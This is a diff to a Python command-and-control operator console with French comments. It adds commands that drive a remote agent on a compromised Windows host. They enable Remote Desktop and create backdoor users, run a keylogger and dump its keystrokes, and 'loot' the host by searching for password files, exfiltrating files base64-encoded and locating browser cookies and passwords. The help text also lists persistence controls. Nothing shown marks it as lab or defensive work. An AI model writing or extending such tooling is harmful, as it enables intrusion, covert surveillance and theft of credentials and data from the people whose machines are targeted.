@@ -213,8 +213,10 @@ def cmd_shell(command):
         if response.status_code == 200:
             print(f"[+] Command queued for {current_agent}")
             print(f"[*] Command: {command}")
-            print(f"[*] Tip: Use 'results' to see the output")
             log(f"Command queued successfully")
+
+            # Auto-attendre et afficher les résultats
+            wait_for_results(current_agent, timeout=10, poll_interval=2)
         else:
             print(f"[-] Server error: {response.status_code}")
             log(f"ERROR: Server returned {response.status_code}")
@@ -222,6 +224,218 @@ def cmd_shell(command):
     except Exception as e:
         print(f"[-] Error: {e}")
         log(f"ERROR: {e}")
+
+
+def cmd_rdp(args):
+    """Commande RDP : activer/désactiver Remote Desktop"""
+    if not current_agent:
+        print("[-] No agent selected. Use 'use <agent_id>' first")
+        return
+
+    if not args:
+        print("[-] Usage: rdp <enable|disable|status|adduser <user> <pass>>")
+        print("[*] Examples:")
+        print("    rdp enable          # Enable RDP on target")
+        print("    rdp disable         # Disable RDP")
+        print("    rdp status          # Check RDP status")
+        print("    rdp adduser alice P@ssw0rd  # Create RDP user")
+        return
+
+    try:
+        payload = {
+            "agent_id": current_agent,
+            "type": "shell",
+            "command": f"rdp {args}"
+        }
+
+        log(f"Sending RDP command to {current_agent}: rdp {args}")
+
+        response = requests.post(
+            f"{C2_URL}/command",
+            json=payload,
+            timeout=5
+        )
+
+        if response.status_code == 200:
+            print(f"[+] RDP command queued for {current_agent}")
+            print(f"[*] Command: rdp {args}")
+            log(f"RDP command queued successfully")
+
+            # Auto-attendre et afficher les résultats
+            wait_for_results(current_agent, timeout=10, poll_interval=2)
+        else:
+            print(f"[-] Server error: {response.status_code}")
+            log(f"ERROR: Server returned {response.status_code}")
+
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        log(f"ERROR: {e}")
+
+
+def cmd_keylog(args):
+    """Commande Keylog : capturer les frappes clavier"""
+    if not current_agent:
+        print("[-] No agent selected. Use 'use <agent_id>' first")
+        return
+
+    if not args:
+        print("[-] Usage: keylog <start|stop|dump|status>")
+        print("[*] Examples:")
+        print("    keylog start    # Start keystroke capture")
+        print("    keylog stop     # Stop keystroke capture")
+        print("    keylog dump     # Retrieve captured keystrokes")
+        print("    keylog status   # Check keylogger status")
+        return
+
+    try:
+        payload = {
+            "agent_id": current_agent,
+            "type": "shell",
+            "command": f"keylog {args}"
+        }
+
+        log(f"Sending keylog command to {current_agent}: keylog {args}")
+
+        response = requests.post(
+            f"{C2_URL}/command",
+            json=payload,
+            timeout=5
+        )
+
+        if response.status_code == 200:
+            print(f"[+] Keylog command queued for {current_agent}")
+            print(f"[*] Command: keylog {args}")
+            log(f"Keylog command queued successfully")
+
+            # Auto-attendre et afficher les résultats
+            wait_for_results(current_agent, timeout=10, poll_interval=2)
+        else:
+            print(f"[-] Server error: {response.status_code}")
+            log(f"ERROR: Server returned {response.status_code}")
+
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        log(f"ERROR: {e}")
+
+
+def cmd_loot(args):
+    """Commande Loot : exfiltration de données sensibles"""
+    if not current_agent:
+        print("[-] No agent selected. Use 'use <agent_id>' first")
+        return
+
+    if not args:
+        print("[-] Usage: loot <sysinfo|find <pattern>|grab <file>|browser>")
+        print("[*] Examples:")
+        print("    loot sysinfo        # Collect system information")
+        print("    loot find *.txt     # Search for text files")
+        print("    loot grab C:\\file.txt # Exfiltrate a file (base64)")
+        print("    loot browser        # Find browser data locations")
+        return
+
+    try:
+        payload = {
+            "agent_id": current_agent,
+            "type": "shell",
+            "command": f"loot {args}"
+        }
+
+        log(f"Sending loot command to {current_agent}: loot {args}")
+
+        response = requests.post(
+            f"{C2_URL}/command",
+            json=payload,
+            timeout=5
+        )
+
+        if response.status_code == 200:
+            print(f"[+] Loot command queued for {current_agent}")
+            print(f"[*] Command: loot {args}")
+            log(f"Loot command queued successfully")
+
+            # Auto-attendre et afficher les résultats (timeout plus long pour find/grab)
+            wait_for_results(current_agent, timeout=15, poll_interval=2)
+        else:
+            print(f"[-] Server error: {response.status_code}")
+            log(f"ERROR: Server returned {response.status_code}")
+
+    except Exception as e:
+        print(f"[-] Error: {e}")
+        log(f"ERROR: {e}")
+
+
+def wait_for_results(agent_id, timeout=10, poll_interval=2):
+    """
+    Attend et affiche automatiquement les nouveaux résultats
+
+    Args:
+        agent_id: ID de l'agent cible
+        timeout: Temps max d'attente en secondes
+        poll_interval: Intervalle entre chaque vérification
+
+    Returns:
+        True si des résultats ont été trouvés, False sinon
+    """
+    print(f"[*] Waiting for results (max {timeout}s)...", end="", flush=True)
+
+    # Obtenir le nombre actuel de résultats
+    try:
+        response = requests.get(f"{C2_URL}/results/{agent_id}", timeout=5)
+        initial_count = 0
+        if response.status_code == 200:
+            data = response.json()
+            initial_count = len(data.get("results", []))
+    except:
+        initial_count = 0
+
+    # Polling avec timeout
+    start_time = time.time()
+    while (time.time() - start_time) < timeout:
+        try:
+            response = requests.get(f"{C2_URL}/results/{agent_id}", timeout=5)
+
+            if response.status_code == 200:
+                data = response.json()
+                results_list = data.get("results", [])
+
+                # Vérifier si de nouveaux résultats sont arrivés
+                if len(results_list) > initial_count:
+                    print("\r[+] Results received!                    ")
+
+                    # Afficher seulement les nouveaux résultats
+                    new_results = results_list[initial_count:]
+
+                    print(f"\n{'=' * 70}")
+                    print(f"[Command Output]")
+                    print(f"{'=' * 70}\n")
+
+                    for result in new_results:
+                        timestamp = result.get('timestamp', 'N/A')
+                        command = result.get('command', 'N/A')
+                        output = result.get('output', '')
+
+                        print(f"[{timestamp}]")
+                        print(f"Command: {command}")
+                        print(f"Output:")
+                        for line in output.split('\n'):
+                            print(f"  {line}")
+
+                    print(f"{'=' * 70}\n")
+                    log(f"Auto-displayed result for command on {agent_id}")
+                    return True
+
+            # Afficher un point pour indiquer que ça tourne
+            print(".", end="", flush=True)
+            time.sleep(poll_interval)
+
+        except Exception as e:
+            log(f"ERROR during wait_for_results: {e}")
+            break
+
+    # Timeout atteint
+    print(f"\r[-] Timeout reached. Use 'results' to check manually.                    ")
+    log(f"Timeout waiting for results from {agent_id}")
+    return False
 
 
 def cmd_results(agent_id=None, auto_wait=False):
@@ -336,6 +550,9 @@ Available Commands:
   agents              List all connected agents
   use <agent_id>      Select an agent to interact with
   shell <command>     Execute shell command on selected agent
+  rdp <args>          Manage Remote Desktop on selected agent
+  keylog <args>       Capture keystrokes on selected agent
+  loot <args>         Exfiltrate data and search for files
   results [agent_id]  Show command results (current or specified agent)
   watch               Auto-refresh results in real-time (Ctrl+C to stop)
   clear               Clear screen
@@ -345,18 +562,55 @@ Available Commands:
 Examples:
 ──────────────────────────────────────────────────────────
   agents                    # List all agents
-  use TEST_C                # Select agent TEST_C
+  use WIN_25653CD9          # Select agent WIN_25653CD9
   shell whoami              # Run 'whoami' on selected agent
   shell dir C:\\Users       # Run 'dir C:\\Users'
+  rdp enable                # Enable RDP on target
+  rdp status                # Check RDP status
+  rdp adduser alice Pass123 # Create RDP user with password
+  rdp disable               # Disable RDP
+  keylog start              # Start keystroke capture
+  keylog dump               # Retrieve captured keys
+  keylog stop               # Stop capture
+  loot sysinfo              # Collect system information
+  loot browser              # Find browser data locations
+  loot find *.txt           # Search for text files
   results                   # Show results for current agent
   watch                     # Auto-refresh results every 2s
-  results TEST_C            # Show results for specific agent
+  results WIN_25653CD9      # Show results for specific agent
+
+RDP Commands (require admin privileges):
+──────────────────────────────────────────────────────────
+  rdp enable                # Enable Remote Desktop (port 3389)
+  rdp disable               # Disable Remote Desktop
+  rdp status                # Check current RDP status
+  rdp adduser <user> <pass> # Create user with RDP access
+
+Keylog Commands (VERY suspicious):
+──────────────────────────────────────────────────────────
+  keylog start              # Start capturing keystrokes
+  keylog stop               # Stop capturing keystrokes
+  keylog dump               # Retrieve captured keystrokes
+  keylog status             # Check keylogger status
+
+Loot Commands (data exfiltration):
+──────────────────────────────────────────────────────────
+  loot sysinfo              # Collect system information
+  loot find <pattern>       # Search for files (*.txt, password*, etc.)
+  loot grab <filepath>      # Exfiltrate a file (base64 encoded)
+  loot browser              # Find browser data locations (cookies, passwords)
+
+Agent Control:
+──────────────────────────────────────────────────────────
+  shell exit                # Stop agent gracefully (no persistence removal)
+  shell killme              # Stop agent + remove all persistence
 
 Tips:
 ──────────────────────────────────────────────────────────
   - Use arrow keys (↑/↓) to navigate command history
   - All commands are logged to: {0}
   - Use 'watch' mode to see results as they arrive
+  - RDP actions require admin privileges on target
   - Press Ctrl+C or type 'exit' to quit
 """.format(LOG_FILE)
 
@@ -435,6 +689,12 @@ def main():
                 cmd_use(args)
             elif cmd == "shell":
                 cmd_shell(args)
+            elif cmd == "rdp":
+                cmd_rdp(args)
+            elif cmd == "keylog":
+                cmd_keylog(args)
+            elif cmd == "loot":
+                cmd_loot(args)
             elif cmd == "results":
                 cmd_results(args if args else None)
             elif cmd == "watch":
